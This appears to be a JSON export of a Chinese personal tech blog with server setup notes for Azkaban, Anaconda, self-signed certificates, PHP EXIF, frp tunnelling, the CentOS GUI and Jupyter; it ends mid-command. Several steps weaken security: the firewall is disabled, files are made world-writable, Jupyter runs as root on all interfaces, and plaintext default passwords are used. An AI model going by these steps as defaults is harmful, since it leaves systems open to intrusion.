_nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); TX=0;}/********************************************************/void main(void) { TMOD=0x21; //设T0为方式1，GATE=1； SCON=0x50; TH1=0xFD; TL1=0xFD; TH0=0; TL0=0; TR0=1; ET0=1; //允许T0中断 TR1=1; //开启定时器 TI=1; EA=1; //开启总中断 while(1) { StartModule(); while(!RX); //当RX为零时等待 TR0=1; //开启计数 while(RX); //当RX为1计数并等待 TR0=0; //关闭计数 Conut(); //计算 delayms(100); //100MS }}"},{"title":"","date":"2019-05-10T06:37:00.000Z","updated":"2022-05-12T07:35:00.000Z","comments":true,"path":"notes/Azkaban/deploy.html","permalink":"https://blog.mhuig.top/notes/Azkaban/deploy","excerpt":"","text":"安装部署 Azkaban 安装部署 azkaban 单服务模式安装与使用所需软件azkaban-solo-server单服务模式安装 第一步：解压azkaban 的 solo server 使用的是一个单节点的模式来进行启动服务的，只需要一个 azkaban-solo-server-0.1.0-SNAPSHOT.tar.gz 的安装包即可启动，所有的数据信息都是保存在 H2 这个 azkaban 默认的数据当中，上传我们的压缩包，然后修改配置文件启动即可 cd /export/softwarestar -zxvf azkaban-solo-server-0.1.0-SNAPSHOT.tar.gz -C ../servers/ 第二步：修改两个配置文件修改时区配置文件 cd /export/servers/azkaban-solo-server-0.1.0-SNAPSHOT/confvim azkaban.properties azkaban.propertiesdefault.timezone.id=Asia/Shanghai 修改 commonprivate.properties 配置文件 cd /export/servers/azkaban-solo-server-0.1.0-SNAPSHOT/plugins/jobtypesvim commonprivate.properties commonprivate.propertiesexecute.as.user=falsememCheck.enabled=false 第三步：启动 solo-server启动 azkaban-solo-server cd /export/servers/azkaban-solo-server-0.1.0-SNAPSHOTbin/start-solo.sh 第四步：浏览器页面访问浏览器页面访问 http://node03:8081/ azkaban 两个服务模式安装确认所需软件Azkaban Web 服务安装包azkaban-web-server-0.1.0-SNAPSHOT.tar.gzAzkaban 执行服务安装包azkaban-exec-server-0.1.0-SNAPSHOT.tar.gz编译之后的 sql 脚本create-all-sql-0.1.0-SNAPSHOT.sqlC 程序文件脚本execute-as-user.c 程序 数据库准备进入 mysql 的客户端执行以下命令 mysql -uroot -p CREATE DATABASE azkaban;CREATE USER 'azkaban'@'%' IDENTIFIED BY 'azkaban';GRANT all privileges ON azkaban.* to 'azkaban'@'%' identified by 'azkaban' WITH GRANT OPTION;flush privileges;use azkaban;source /export/softwares/create-all-sql-0.1.0-SNAPSHOT.sql; 解压软件安装包解压 azkaban-web-server cd /export/softwarestar -zxvf azkaban-web-server-0.1.0-SNAPSHOT.tar.gz -C ../servers/cd /export/serversmv azkaban-web-server-0.1.0-SNAPSHOT/ azkaban-web-server-3.51.0 解压 azkaban-exec-server cd /export/softwarestar -zxvf azkaban-exec-server-0.1.0-SNAPSHOT.tar.gz -C ../servers/cd /export/serversmv azkaban-exec-server-0.1.0-SNAPSHOT/ azkaban-exec-server-3.51.0 安装 SSL 安全认证 允许我们使用 https 的方式访问 azkaban 的 web 服务密码 azkaban 一定要一个个的字母输入，或者粘贴也行 cd /export/servers/azkaban-web-server-3.51.0keytool -keystore keystore -alias jetty -genkey -keyalg RSA azkaban web server 安装修改 azkaban-web-server 的配置文件 cd /export/servers/azkaban-web-server-3.51.0/confvim azkaban.properties azkaban.properties# Azkaban Personalization Settingsazkaban.name=Azkabanazkaban.label=My Azkabanazkaban.color=#FF3601azkaban.default.servlet.path=/indexweb.resource.dir=web/default.timezone.id=Asia/Shanghai# Azkaban UserManager classuser.manager.class=azkaban.user.XmlUserManageruser.manager.xml.file=conf/azkaban-users.xml# Loader for projectsexecutor.global.properties=conf/global.propertiesazkaban.project.dir=projects# Velocity dev modevelocity.dev.mode=false# Azkaban Jetty server properties.jetty.use.ssl=truejetty.maxThreads=25jetty.port=8081jetty.keystore=/export/servers/azkaban-web-server-3.51.0/keystorejetty.password=azkabanjetty.keypassword=azkabanjetty.truststore=/export/servers/azkaban-web-server-3.51.0/keystorejetty.trustpassword=azkaban# Azkaban Executor settings# mail settingsmail.sender=mail.host=# User facing web server configurations used to construct the user facing server URLs. They are useful when there is a reverse proxy between Azkaban web servers and users.# enduser -&gt; myazkabanhost:443 -&gt; proxy -&gt; localhost:8081# when this parameters set then these parameters are used to generate email links.# if these parameters are not set then jetty.hostname, and jetty.port(if ssl configured jetty.ssl.port) are used.# azkaban.webserver.external_hostname=myazkabanhost.com# azkaban.webserver.external_ssl_port=443# azkaban.webserver.external_port=8081job.failure.email=job.success.email=lockdown.create.projects=falsecache.directory=cache# JMX statsjetty.connector.stats=trueexecutor.connector.stats=true# Azkaban mysql settings by default. Users should configure their own username and password.database.type=mysqlmysql.port=3306mysql.host=node03mysql.database=azkabanmysql.user=azkabanmysql.password=azkabanmysql.numconnections=100#Multiple Executorazkaban.use.multiple.executors=true#azkaban.executorselector.filters=StaticRemainingFlowSize,MinimumFreeMemory,CpuStatusazkaban.executorselector.comparator.NumberOfAssignedFlowComparator=1azkaban.executorselector.comparator.Memory=1azkaban.executorselector.comparator.LastDispatched=1azkaban.executorselector.comparator.CpuUsage=1#executor.port=12321 azkaban executor server 安装第一步：修改 azkaban-exex-server 配置文件 cd /export/servers/azkaban-exec-server-3.51.0/confvim azkaban.properties azkaban.properties# Azkaban Personalization Settingsazkaban.name=Azkabanazkaban.label=My Azkabanazkaban.color=#FF3601azkaban.default.servlet.path=/indexweb.resource.dir=web/default.timezone.id=Asia/Shanghai# Azkaban UserManager classuser.manager.class=azkaban.user.XmlUserManageruser.manager.xml.file=conf/azkaban-users.xml# Loader for projectsexecutor.global.properties=conf/global.propertiesazkaban.project.dir=projects# Velocity dev modevelocity.dev.mode=false# Azkaban Jetty server properties.jetty.use.ssl=truejetty.maxThreads=25jetty.port=8081jetty.keystore=/export/servers/azkaban-web-server-3.51.0/keystorejetty.password=azkabanjetty.keypassword=azkabanjetty.truststore=/export/servers/azkaban-web-server-3.51.0/keystorejetty.trustpassword=azkaban# Where the Azkaban web server is locatedazkaban.webserver.url=https://node03:8443# mail settingsmail.sender=mail.host=# User facing web server configurations used to construct the user facing server URLs. They are useful when there is a reverse proxy between Azkaban web servers and users.# enduser -&gt; myazkabanhost:443 -&gt; proxy -&gt; localhost:8081# when this parameters set then these parameters are used to generate email links.# if these parameters are not set then jetty.hostname, and jetty.port(if ssl configured jetty.ssl.port) are used.# azkaban.webserver.external_hostname=myazkabanhost.com# azkaban.webserver.external_ssl_port=443# azkaban.webserver.external_port=8081job.failure.email=job.success.email=lockdown.create.projects=falsecache.directory=cache# JMX statsjetty.connector.stats=trueexecutor.connector.stats=true# Azkaban plugin settingsazkaban.jobtype.plugin.dir=plugins/jobtypes# Azkaban mysql settings by default. Users should configure their ownusername and password.database.type=mysqlmysql.port=3306mysql.host=node03mysql.database=azkabanmysql.user=azkabanmysql.password=azkabanmysql.numconnections=100# Azkaban Executor settingsexecutor.maxThreads=50executor.flow.threads=30 第二步：添加插件 将我们编译后的 C 文件 execute-as-user.c上传到这个目录来/export/servers/azkaban-exec-server-3.51.0/plugins/jobtypes或者直接将我们/export/softwares 下面的文件拷贝过来也行 cp /export/softwares/execute-as-user.c /export/servers/azkaban-execserver-3.51.0/plugins/jobtypes/ 然后执行以下命令生成 execute-as-user yum -y install gcc-c++cd /export/servers/azkaban-exec-server-3.51.0/plugins/jobtypesgcc execute-as-user.c -o execute-as-userchown root execute-as-userchmod 6050 execute-as-user 第三步：修改配置文件 修改配置文件 cd /export/servers/azkaban-exec-server-3.51.0/plugins/jobtypesvim commonprivate.properties commonprivate.propertiesexecute.as.user=falsememCheck.enabled=falseazkaban.native.lib=/export/servers/azkaban-exec-server3.51.0/plugins/jobtypes 启动服务第一步：启动 azkaban exec server cd /export/servers/azkaban-exec-server-3.51.0bin/start-exec.sh 第二步：激活我们的 exec-server node03 机器任意目录下执行以下命令 (随机找个端口号进行激活) curl -G \"node03:$(&lt;./executor.port)/executor?action=activate\" &amp;&amp; echo 第三步：启动 azkaban-web-serve cd /export/servers/azkaban-web-server-3.51.0/bin/start-web.sh 访问地址：https://node03:8443 修改 linux 的时区问题由于先前做好了时钟同步，所以不用担心时区问题，不需要修改时区了注：先配置好服务器节点上的时区1、先生成时区配置文件 Asia / Shanghai，用交互式命令 tzselect 即可2、拷贝该时区文件，覆盖系统本地时区配置 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime Azkaban 实战Azkaba 内置的任务类型支持 command、javaCommand 类型单一 job 示例创建 job 描述文件创建文本文件，更改名称为 mycommand.job注意后缀.txt 一定不要带上，保存为格式为 UFT-8 without bom内容如下 type=commandcommand=echo 'hello world' 将 job 资源文件打包成 zip 文件创建 project 并上传压缩包通过 azkaban 的 web 管理平台创建 project 并上传 job 压缩包首先创建 project上传 zip 包启动执行 job Command 类型多 job 工作流 flow1、创建有依赖关系的多个 job 描述 第一个 job：foo.job type=commandcommand=echo 'foo' 第二个 job：bar.job 依赖 foo.job type=commanddependencies=foocommand=echo 'bar' 2、将所有 job 资源文件打到一个 zip 包中3、在 azkaban 的 web 管理界面创建工程并上传 zip 包4、启动工作流 flow HDFS 操作任务 (通过 azkaban 在 hdfs 上创建一个目录)1、创建 job 描述文件 fs.job type=commandcommand=/export/servers/hadoop-2.6.0-cdh5.14.0/bin/hdfs dfs -mkdir /azkaban 2、将 job 资源文件打包成 zip 文件3、通过 azkaban 的 web 管理平台创建 project 并上传 job 压缩包4、启动执行该 job MAPREDUCE 任务Mr 任务依然可以使用 command 的 job 类型来执行 1、创建 job 描述文件，及 mr 程序 jar 包（示例中直接使用 hadoop 自带的 example jar） type=commandcommand=/export/servers/hadoop-2.6.0-cdh5.14.0/bin/hadoop jar hadoopmapreduce-examples-2.6.0-cdh5.14.0.jar pi 3 5 2、将所有 job 资源文件打到一个 zip 包中3、在 azkaban 的 web 管理界面创建工程并上传 zip 包4、启动 job HIVE 脚本任务创建 job 描述文件和 hive 脚本Hive 脚本： hive.sql create database if not exists azhive;use azhive;create table if not exists aztest(id string,name string) row format delimitedfields terminated by '\\t'; Job 描述文件：hive.job type=commandcommand=/export/servers/hive-1.1.0-cdh5.14.0/bin/hive -f 'hive.sql' 将所有 job 资源文件打到一个 zip 包中在 azkaban 的 web 管理界面创建工程并上传 zip 包启动 job cd /export/servers/hive-1.1.0-cdh5.14.0/bin/hiveshow databases;use azhive;show tables; azkaban 的定时任务使用 azkaban 的 scheduler 功能可以实现对我们的作业任务进行定时调度功能"},{"title":"","date":"2022-05-10T06:36:00.000Z","updated":"2022-05-10T06:36:00.000Z","comments":true,"path":"notes/Azkaban/index.html","permalink":"https://blog.mhuig.top/notes/Azkaban/","excerpt":"","text":".fa-secondary{opacity:.4} Azkaban Azkaban .prev-next{ display: none !important; }"},{"title":"","date":"2019-05-10T06:37:00.000Z","updated":"2022-05-12T07:35:00.000Z","comments":true,"path":"notes/Azkaban/overview.html","permalink":"https://blog.mhuig.top/notes/Azkaban/overview","excerpt":"","text":"Overview Azkaban Overview 为什么需要工作流调度系统 一个完整的数据分析系统通常都是由大量任务单元组成：shell 脚本程序，java 程序，mapreduce 程序、hive 脚本等 各任务单元之间存在时间先后及前后依赖关系 为了很好地组织起这样的复杂执行计划，需要一个工作流调度系统来调度执行； 例如，我们可能有这样一个需求，某个业务系统每天产生 20G 原始数据，我们每天都要对其进行处理，处理步骤如下所示： 1、 通过 Hadoop 先将原始数据同步到 HDFS 上； 2、 借助 MapReduce 计算框架对原始数据进行转换，生成的数据以分区表的形式存储到多张 Hive 表中； 3、 需要对 Hive 中多个表的数据进行 JOIN 处理，得到一个明细数据 Hive 大表； 4、 将明细数据进行各种统计分析，得到结果报表信息； 5、 需要将统计分析得到的结果数据同步到业务系统中，供业务调用使用。 工作流调度实现方式简单的任务调度：直接使用 linux 的 crontab 来定义；复杂的任务调度：开发调度平台或使用现成的开源调度系统，比如 ooize、azkaban、airflow 等 常见工作流调度系统市面上目前有许多工作流调度器在 hadoop 领域，常见的工作流调度器有 Oozie, Azkaban,Cascading,Hamake 等 Azkaban 介绍azkaban 官网：https://azkaban.github.io/ Azkaban 是由 Linkedin 开源的一个批量工作流任务调度器。用于在一个工作流内以一个特定的顺序运行一组工作和流程。Azkaban 定义了一种 KV 文件 (properties) 格式来建立任务之间的依赖关系，并提供一个易于使用的 web 用户界面维护和跟踪你的工作流。它有如下功能特点： Web 用户界面 方便上传工作流 方便设置任务之间的关系 调度工作流 认证 / 授权 (权限的工作) 能够杀死并重新启动工作流 模块化和可插拔的插件机制 项目工作区 工作流和任务的日志记录和审计"},{"title":"","date":"2019-09-22T03:14:00.000Z","updated":"2022-05-12T08:50:00.000Z","comments":true,"path":"notes/CentOS/anaconda3.html","permalink":"https://blog.mhuig.top/notes/CentOS/anaconda3","excerpt":"","text":"安装 Anaconda3 Centos7 安装 Anaconda3 Anaconda 是一个免费开源的 Python 和 R 语言的发行版本，用于计算科学（数据科学、机器学习、大数据处理和预测分析），Anaconda 致力于简化包管理和部署。 安装下载 Anaconda方式一：官方网站 方式二：清华大学开源软件镜像站 可以下载到本地，然后通过 xftp 上传到 Contos 上 bash&nbsp; &nbsp;Anaconda3-4.4.0-Linux-x86_64.sh 该按 enter 按，该 yes|no 的 yes。 source ~/.bashrc 然后重启终端，然后输入 python Anaconda 虚拟环境创建环境conda create -n envname python=3.6&nbsp; 删除环境conda remove -n envname --all 激活环境source activate envname 退出环境source deactivate Anaconda 换源添加清华源conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forgeconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/conda config --set show_channel_urls yes 删源conda config --remove-key channels 附录清华大学开源软件镜像站 channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/ssl_verify: true 上海交通大学开源镜像站 channels: - https://mirrors.sjtug.sjtu.edu.cn/anaconda/pkgs/main/ - https://mirrors.sjtug.sjtu.edu.cn/anaconda/pkgs/free/ - https://mirrors.sjtug.sjtu.edu.cn/anaconda/cloud/conda-forge/ssl_verify: true 中国科学技术大学 USTC Mirror channels: - https://mirrors.ustc.edu.cn/anaconda/pkgs/main/ - https://mirrors.ustc.edu.cn/anaconda/pkgs/free/ - https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/ssl_verify: true .bashrc 里面修改过 PATH 环境变量，添加过 anaconda/bin vi ~/.bashrc 最后添加 conda deactivate source .bashrc"},{"title":"","date":"2019-09-19T03:24:00.000Z","updated":"2022-05-10T07:12:00.000Z","comments":true,"path":"notes/CentOS/centosx3.html","permalink":"https://blog.mhuig.top/notes/CentOS/centosx3","excerpt":"","text":"三台虚拟机创建并联网 大数据处理技术 - 三台虚拟机创建并联网 volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-BigData-Archive-4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", \"MHuiG\", \"BigData-Archive\", \"4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", false); })"},{"title":"","date":"2019-09-23T11:53:00.000Z","updated":"2022-05-12T12:30:00.000Z","comments":true,"path":"notes/CentOS/certificate.html","permalink":"https://blog.mhuig.top/notes/CentOS/certificate","excerpt":"","text":"自建 https 证书 自建 https 证书 生成 nginx 的证书与配置 chrome 安全告警的问题 安装 openssl生成根证书openssl req -x509 -nodes -days 1461 -newkey rsa:2048 -subj \"/C=CN/ST=MyProvince/L=MyCity/O=MyOrganization\" -keyout CA-private.key -out CA-certificate.crt -reqexts v3_req -extensions v3_ca 生成私钥openssl genrsa -out private.key 2048 openssl req -new -key private.key -subj \"/C=CN/ST=MyProvince/L=MyCity/O=MyOrganization/CN=xxx.xxx.xxx.xxx\" -sha256 -out private.csr 解决 Chrome 安全警告按照上面的流程，需要注意的是，在默认情况下生成的证书一旦选择信任，在 Edge, Firefox 等浏览器都显示为安全，但是 Chrome 仍然会标记为不安全并警告拦截，这是因为 Chrome 需要证书支持扩展 Subject Alternative Name, 因此生成时需要特别指定 SAN 扩展并添加相关参数。SAN Extension 所需配置文件关键属性： req_distinguished_name: 一节的内容与上面 -subj 一样都是证书的附加信息subjectAltName: 是最关键的属性，取值有两种情况，除前缀外值应与上一步 -subj 中指定的 CN 参数值相同：如果是为某一域名签发证书，则其值可为 DNS:www.example.com 或者使用通配符 DNS:*.example.com；如果为 IP 地址颁发证书，则应该使用 IP:xxx.xxx.xxx.xxx 的形式。 [ req ]default_bits = 2048distinguished_name = req_distinguished_namereq_extensions = sanextensions = san[ req_distinguished_name ]countryName = CNstateOrProvinceName = MyProvincelocalityName = MyCityorganizationName = MyOrganization[SAN]authorityKeyIdentifier=keyid,issuerbasicConstraints=CA:FALSEkeyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEnciphermentsubjectAltName = IP:xxx.xxx.xxx.xxx 将上述内容放到一个文件中, 命名为 private.ext 执行命令, 生成证书openssl x509 -req -days 1461 -in private.csr -CA CA-certificate.crt -CAkey CA-private.key -CAcreateserial -sha256 -out private.crt -extfile private.ext -extensions SAN nginx 中配置如下: server { listen 443; server_name localhost; ssl on; ssl_certificate /alidata/ssl/private.crt; ssl_certificate_key /alidata/ssl/private.key;} 使用证书生成的具体域名证书和私钥可在 nginx 中使用，然后再客户端所在电脑导入根证书： Windows 需要添加根证书至 受信任的根证书颁发机构macOS 将其导入 钥匙串访问 并选择信任另外 Windows 快捷安装根证书脚本如下 (需要管理员权限)： certutil -addstore -f -enterprise -user root \".\\CA-certificate.crt\" 在 window 或者 mac 上安装 private.crt 文件后，nginx 上页面或者接口就可以正常访问了。"},{"title":"","date":"2019-09-22T02:29:00.000Z","updated":"2022-05-12T12:17:00.000Z","comments":true,"path":"notes/CentOS/exif.html","permalink":"https://blog.mhuig.top/notes/CentOS/exif","excerpt":"","text":"PHP - EXIF 扩展 Linux 安装 PHP - EXIF 扩展模块 您可以使用 exif 相关的函数从文件头读取数码相机拍摄的 JPEG 和 TIFF 格式的图像文件元数据。 安装编译 PHP 时安装使用 --enable-exif 选项配置 PHP 来启用 exif 支持。 Windows 用户必须在 php.ini 中启用 php_mbstring.dll 和 php_exif.dll 扩展。请确保在 php.ini 中保持正确的顺序：php_mbstring.dll 必须在 php_exif.dll 之前加载。 源码安装在 PHP 源码中可以找到 EXIF 扩展源码，然后编译安装到当前的 PHP 环境中 cd /Main/sh-1.5.5/php-5.5.7/ext/exif/alidata/server/php-5.5.7/bin/phpize./configure --with-php-config=/alidata/server/php-5.5.7/bin/php-configmake &amp;&amp; make install cd 进入/alidata/server/php-5.5.7/etc 文件夹，修改 php.ini，添加 exif.so 扩展 extension = exif.so 重启Apache 服务器service httpd restart Nginx 的服务器Nginx 服务器重启之前，需要先重启 php-fpm service php-fpm restartnginx -s reload 查看使用 phpinfo () 查看 PHP 环境，安装配置成功。"},{"title":"","date":"2019-09-22T06:30:00.000Z","updated":"2022-05-12T12:25:00.000Z","comments":true,"path":"notes/CentOS/frp.html","permalink":"https://blog.mhuig.top/notes/CentOS/frp","excerpt":"","text":"Frp 内网穿透 Frp 内网穿透 frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。 github 启动 frps cd /Main/frp_024.1_server/chmod -Rf 777 ./*./frps -c frps.ini 相关配置 frps.ini# frps.ini[common]bind_port = 7000token = yourtokendashboard_port = 7500dashboard_user = usernamedashboard_pwd = yourpasswordvhost_http_port = 9000 #设置 http 访问端口 frpc.ini# frpc.ini[common]server_addr = x.x.x.x #假设 frps 所在服务器的公网 IP 为 x.x.x.xserver_port = 7000 #与frps.ini bind_port一致token = yourtoken #与frps.ini token一致#[ssh]#type = tcp#local_ip = 127.0.0.1#local_port = 22#remote_port = 8080[web]type = httplocal_port = 8000 #本地机器上 web 服务对应的端口custom_domains = www.yourdomain.com #绑定自定义域名或serverip 关闭防火墙 systemctl stop firewalld.servicesystemctl disable firewalld.service 设置开机自启动 vim /lib/systemd/system/frps.service frps.service#frps.service[Unit]Description=fraps serviceAfter=network.target syslog.targetWants=network.target[Service]Type=simple#启动服务的命令（此处写你的frps的实际安装目录）ExecStart=/Main/frp_024.1_server/frps -c /Main/frp_024.1_server/frps.ini[Install]WantedBy=multi-user.target 然后就启动 frps sudo systemctl start frps 再打开自启动 sudo systemctl enable frps 如果要重启应用，可以这样 sudo systemctl restart frps 如果要停止应用，可以输入 sudo systemctl stop frps 如果要查看应用的日志，可以输入 sudo systemctl status frps"},{"title":"","date":"2019-09-21T08:23:00.000Z","updated":"2022-05-10T07:12:00.000Z","comments":true,"path":"notes/CentOS/gui.html","permalink":"https://blog.mhuig.top/notes/CentOS/gui","excerpt":"","text":"安装 GUI 图形界面 CentOS7 安装 GUI 图形界面 当你安装 CentOS7 服务器版本的时候，系统默认是不会安装 GUI 的图形界面程序，这个需要手动安装 CentOS7 Gnome GUI 包。 在安装 Gnome 包之前，需要检查一下安装源 (yum) 是否正常，因为需要在 yum 命令来安装 gnome 包。 第一步：先检查 yum 是否安装，以及网络是否有网络。如果这两者都没有，先解决网络，在解决 yum 的安装。 第二步：在命令行下 输入下面的命令来安装 Gnome 包。 yum groupinstall \"GNOME Desktop\" \"Graphical Administration Tools\" 第三步：更新系统的运行级别。 ln -sf /lib/systemd/system/runlevel5.target /etc/systemd/system/default.target 第四步：重启机器。启动默认进入图形界面。 reboot Linux 查看端口状态 netstat -ntulp |grep 8000 杀进程 kill -9 id"},{"title":"","date":"2019-09-22T06:05:00.000Z","updated":"2022-05-12T08:52:00.000Z","comments":true,"path":"notes/CentOS/jupyter.html","permalink":"https://blog.mhuig.top/notes/CentOS/jupyter","excerpt":"","text":"设置 Jupyter CentOS7 设置 Jupyter Jupyter Notebook（前身是 IPython Notebook）是一个基于 Web 的交互式计算环境，用于创建 Jupyter Notebook 文档。Notebook 一词可以通俗地引用许多不同的实体，主要是 Jupyter Web 应用程序、Jupyter Python Web 服务器或 Jupyter 文档格式（取决于上下文）。Jupyter Notebook 文档是一个 JSON 文档，遵循版本化模式，包含一个有序的输入 / 输出单元格列表，这些单元格可以包含代码、文本（使用 Markdown 语言）、数学、图表和富媒体，通常以 “.ipynb” 结尾扩展。 启动jupyter notebook --allow-root --ip 0.0.0.0 --port 9999 默认不允许 / 不建议 root 启动 jupyter, 如果非要用，加上 --allow-root--ip ip 填写 0.0.0.0 或者本机 ip--port 端口号 启动后，浏览器访问对应 ip 和端口就行，需要输入 token,token 在启动界面有输出 生产配置文件每次记住 token，复制再登录不现实 jupyter notebook --generate-config 生成的配置文件位于 ~/.jupyter/jupyter_notebook_config.py jupyter-notebook password 输入两遍密码 启动，就可以 以固定密码登录了 jupyter notebook --allow-root --ip 0.0.0.0 --port 999 设置浏览器打开 jupyter 默认路径vim ~/.jupyter/jupyter_notebook_config.py 填写自己想要的服务器路径c.NotebookApp.notebook_dir='/' 设置 jupyter 开机启动systemctl 脚本目录：/usr/lib/systemd/系统服务目录：/usr/lib/systemd/system/用户服务目录：/usr/lib/systemd/system/ cd /usr/lib/systemd/system/ vim myjupyter.service [UNIT]#服务描述Description=python jupyter Service#指定了在systemd在执行完那些target之后再启动该服务After=network.target[Service]#定义Service的运行类型，一般是forking(后台运行) #Type=forking 这个会卡住啊,不写Type 或者 如下Type=simple#定义systemctl start|stop|reload *.service 的执行方法（具体命令需要写绝对路径）#注：ExecStartPre为启动前执行的命令# ExecStartPre=/usr/bin/test \"x${NETWORKMANAGER}\" = xyesExecStart=/root/anaconda3/bin/jupyter notebook --allow-root --ip 0.0.0.0 --port 9999#ExecReload=# ExecStop=/home/mobileoa/apps/shMediaManager.sh -stop#创建私有的内存临时空间PrivateTmp=True[Install]#多用户WantedBy=multi-user.target vi /root/.jupyter/jupyter_notebook_config.py # Set ip to '*' to bind on all interfaces (ips) for the public serverc.NotebookApp.ip = '*'# It is a good idea to set a known, fixed port for server accessyc.NotebookApp.port = 9999# 是否打开浏览器c.NotebookApp.open_browser = False#设置工作路径c.NotebookApp.notebook_dir = '/' 重载系统服务systemctl daemon-reload 设置开机启动systemctl enable myjupyter.service 启动服务systemctl start myjupyter.service 停止服务systemctl stop myjupyter.service 重启服务systemctl restart myjupyter.service Notebook 支持虚拟运行环境为了让 Jupyter Notebook 支持虚拟运行环境，需要在 Anaconda 里安装一个插件。回到终端下面，用 C-c 退出目前正在运行的 Jupyter Notebook Server，然后执行： conda install nb_conda 再重新开启 Jupyter Notebook 或者 (better) 安装 ipykernel 首先切换到想要在 jupyter notebook 里使用的虚拟环境： conda activate 环境名称 安装 ipykernel： conda install ipykernel 写入 jupyter 的 kernel 在当前虚拟环境里执行： python -m ipykernel install --user --name 环境名称 --display-name \"Python (环境名称)\" “环境名称” 为当前虚拟环境的名称，最后面引号内的字符串是该虚拟环境显示在 jupyter notebook 界面的名字，可以随意修改。 删除 kernel 环境 上面写入 kernel 的配置并不会随虚拟环境的删除而删除。也就是说即使删除了该虚拟环境，jupyter notebook 的界面上仍会有它的选项，只是无法正常使用。 此时就需要去手动删除 kernel 环境了： jupyter kernelspec remove 环境名称 jupyter 中用 notedown 插件来读取 md 文档pip install https://github.com/mli/notedown/tarball/master vi /root/.jupyter/jupyter_notebook_config.py c.NotebookApp.contents_manager_class = 'notedown.NotedownContentsManager' Jupyter Notebook 自定义主题安装好了 Jupyter Notebook 和 Python 之后，我们就已经搭建好啦运行和笔记环境，可以愉快的开始学习了。 于是本着爱折腾的精神和护眼的需求，我搜索了 Jupyter Notebook 的 themes，也就是自定义主题。果然 Github 上有人一早解决了这个问题。 github # install jupyterthemespip install jupyterthemes# upgrade to latest versionpip install --upgrade jupyterthemes 这时候，你就可以在 terminal 里面调用已经安装好的 themes 啦～ 例如，在 terminal 中输入 jt -l 就会返回所有你安装好的主题的名词列表，这样你就知道了你安装了哪些主题。最终，我的选择是 jt -t chesterish -T -N 表示我选择了 chesterish 这个主题，同时希望打开顶部的工具栏（Toolbar），显示笔记本的名字（Name） Jupyter 扩展配置器（ Jupyter NbExtensions Configurator）可以通过 coda 安装： conda install -c conda-forge jupyter_contrib_nbextensionsconda install -c conda-forge jupyter_nbextensions_configurator 也可以使用 pip 安装 pip install jupyter_nbextensions_configuratorjupyter_contrib_nbextensionsjupyter contrib nbextension install --userjupyter nbextensions_configurator enable --user 1. 标题折叠 Collapsible headings 当你在处理一个大型的 notebooks 时，这项扩展非常有用，它可以让你隐藏部分内容。 通知 Notify 当你长时间运行一个任务程序的时候，程序运行结束后，此扩展功能会自动提醒你。 如需使用此扩展，你需要勾选其对应得选择框，并点击 Notify 按钮来选择一个最短通知时间，即 notebook 最少持续运行多久后进行提醒。（需要注意的是，这个扩展只有在 notebook 被浏览器正常打开的情况下才能正常工作。） 代码折叠 Code folding 进度条 tqdm_notebook tqdm 本质上不是一个 notebook 的扩展，它是 Python 中的一个进度条库。 但是此库有时在 jupyter notebooks 会无法正常工作。 Randy Olson 给出一个小小的提醒： tqdm 是一个 Python 的进度条库，在 jupyter notebook 中则被称之为 \"tqdm_notebook\"。自从在 nootbook 中加入了 tqdm_notebook 扩展功能，你再也不用担心其引发的混乱问题了。 （Randy Olson 2018 年 3 月 2 日） % debug 这个本质上也不是 notebook 的一个扩展，而是 IPython 中的一个魔法命令。为了加深你的理解，建议你读一读 Radek Osmulski 的发布 twitter 上的推文。 % debug 魔法命令 得到了一个异常 重新插入一个新的输入框，输入 % debug，然后运行它交互式的调试方法可以打开并显示代码出现异常的语句，方便你联系前后程序查看具体情况。(Radek 2017 年 12 月 26 日) 其他小的拓展与技巧 % Ismagic ：在输入框中运行这个命令，列出所有可用的 IPython 魔法命令 zen mode 扩展： 隐藏菜单栏，让你更专注于代码 Execute time 扩展：显示程序块运行的时间 autoreload：在不重启 notebook 的情况下，自动载入外部文件，从而修改代码，具体操作如下： %load_ext autoreload %autoreload 2 JUPYTER 服务的 NGINX 配置jupyter 配置配置文件在 /home/{user}/.jupyter/jupyter_notebook_config.py 配置 jupyter 的路径 c.NotebookApp.base_url = '/jupyter/' nginx 配置jupyter 使用了 websocket 协议，所以需要配置支持 websocket。 location /jupyter/ { proxy_pass http://jupyter; proxy_set_header Host $host; proxy_set_header X-Real-Scheme $scheme; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # WebSocket support proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; proxy_read_timeout 120s; proxy_next_upstream error;} jupyter notebook 用到了 websocket, 所以需要配置 proxy_set_header Upgrade $http_upgrade;proxy_set_header Connection \"upgrade\";"},{"title":"","date":"2019-09-22T01:29:00.000Z","updated":"2022-05-12T12:15:00.000Z","comments":true,"path":"notes/CentOS/kodexplorer.html","permalink":"https://blog.mhuig.top/notes/CentOS/kodexplorer","excerpt":"","text":"KodExplorer 云服务器部署可道云 (KodExplorer) 在做一些项目的时候，经常有一些文档交流，修改之后的文档在 QQ 或微信上发来发去，还要下载，我们在这里部署 KodExplorer 可道云。 kodexplorer 可道云是目前国内有代表性、美观易用性好的私有云软件，本文介绍在阿里云的云服务器上如何部署 kodexplorer 可道云，搭建私有网盘。 注意：云服务器部署和普通的 Ubuntu 上部署有一些区别，因为云服务器上只能使用命令行，没有界面。 官方下载页面:https://kodcloud.com/download/。其中有 Linux 获取最新版可道云的相关命令。 下载命令： wget 